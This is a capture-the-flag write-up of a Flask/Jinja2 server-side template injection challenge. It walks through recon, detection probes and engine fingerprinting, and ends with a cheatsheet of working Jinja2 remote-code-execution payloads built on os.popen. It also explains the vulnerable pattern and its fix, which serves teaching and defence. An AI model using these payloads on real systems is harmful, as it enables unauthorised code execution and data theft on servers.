---
type: writeup
source: CyLab
event: CyLab Academy
category: Web
difficulty: medium
status: solved
flags: kept
tags: [writeup, web]
---

# SSTI1

## Task
PWN had no task.md for this challenge. It is a web exploitation challenge built on a Flask app using the Jinja2 template engine. The site lets you submit an "announcement" that gets rendered back to you on the page, and the goal is to read the flag.

## Approach
Before touching the vuln, I ran the same enumeration checklist I would run on any web-app CTF. Building this habit matters more than the flag, because on harder challenges the recon is the hint.

1. Look at the page. Load the site, read the visible text, and note every input: forms, search boxes, URL parameters, file uploads. Here, the announcement form is the obvious attack surface.
2. View source and read the HTML. Check for comments, hidden fields, dev notes, and JS files.
3. Inspect requests. Open DevTools (Network tab) or Burp and watch what the form actually sends. Note the method (GET vs POST), parameter names, and how input comes back in the response. Seeing input reflected on the page is the first signal for any injection class.
4. Fingerprint the stack. Check response headers (`Server`, `X-Powered-By`), cookie names (a `session` cookie in Flask's signed format is a tell), and error page styling. This one screams Python/Flask.
5. Check the usual files: `/robots.txt`, `/sitemap.xml`, `/.git/`, `/admin`. Not every challenge uses these, but checking costs seconds.
6. Probe the input for how it is handled. Submit something benign, then something special. Does HTML render? Does `{{ }}` evaluate? This is where recon hands off to exploitation.

The problem here: input is dropped directly into the template string instead of being passed as data, so anything typed gets evaluated as template code. That is Server-Side Template Injection, a fast path from "echo a string" to full remote code execution.

## Solution
1. Detect the injection. Submit a math expression wrapped in Jinja's output syntax:

```
{{7*7}}
```

The page returns `49` instead of the literal text. If `{{7*7}}` is evaluated server-side, you have SSTI.

2. Fingerprint the engine. Different engines handle string math differently:

```
{{7*'7'}}
```

- Jinja2 (Python) returns `7777777` (string repetition)
- Twig (PHP) returns `49`

I got `7777777`, confirming Jinja2 / Python.

3. Escalate to RCE. Break out of the template sandbox and reach Python's `os` module via globals attached to a built-in object. List the directory first:

```
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
```

A file named `flag` shows up in the output.

4. Read the flag:

```
{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

That dumps the `picoCTF{...}` flag.

If `cycler` is filtered, `lipsum.__globals__.os.popen('cat flag').read()` and `request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()` are drop-in alternatives that work on the same app.

## Flag
PWN notes did not record the literal flag value (the solve produced a `picoCTF{...}` flag read from the `flag` file).

## Lessons
- SSTI happens when user input is concatenated into the template, not passed as a context variable. The vulnerable pattern is `render_template_string("... " + user_input)`. The fix is to render a static template and pass user input as data: `render_template_string("{{ msg }}", msg=user_input)`.
- `{{7*7}}` is your universal probe, but confirming the engine matters. `{{7*'7'}}` is the single best fingerprint because the behavior forks cleanly between Python and PHP engines, and that decides the whole exploit chain.
- Python's object model is the real attack surface. Once in a Jinja2 context, almost any object (`cycler`, `lipsum`, `request`, `config`, `self`) is a doorway to `__globals__`, and from there to `os`. You are not really attacking the template, you are walking Python's introspection graph back to code execution.

## Cheatsheet

**Recon checklist**
```
- Read page + note every input
- View source, check comments + JS
- Watch requests (DevTools / Burp)
- Fingerprint stack (headers, cookies, errors)
- Check /robots.txt /sitemap.xml /.git/ /admin
- Probe inputs: HTML? template eval?
```

**Detection**
```
{{7*7}}            -> 49 means SSTI
${7*7}             -> alt syntax (some engines)
<%= 7*7 %>         -> alt syntax (ERB/others)
```

**Engine fingerprint**
```
{{7*'7'}}          -> 7777777 = Jinja2/Python | 49 = Twig/PHP
```

**Recon (Jinja2)**
```
{{ config }}
{{ config.items() }}
{{ self.__init__.__globals__ }}
```

**RCE payloads (Jinja2), swap the command in popen()**
```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('ls').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

**Classic MRO chain (when the shortcuts are filtered)**
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
# find subprocess.Popen's index, then call it to run commands
```

**Read the flag**
```
{{ lipsum.__globals__.os.popen('cat flag').read() }}
```
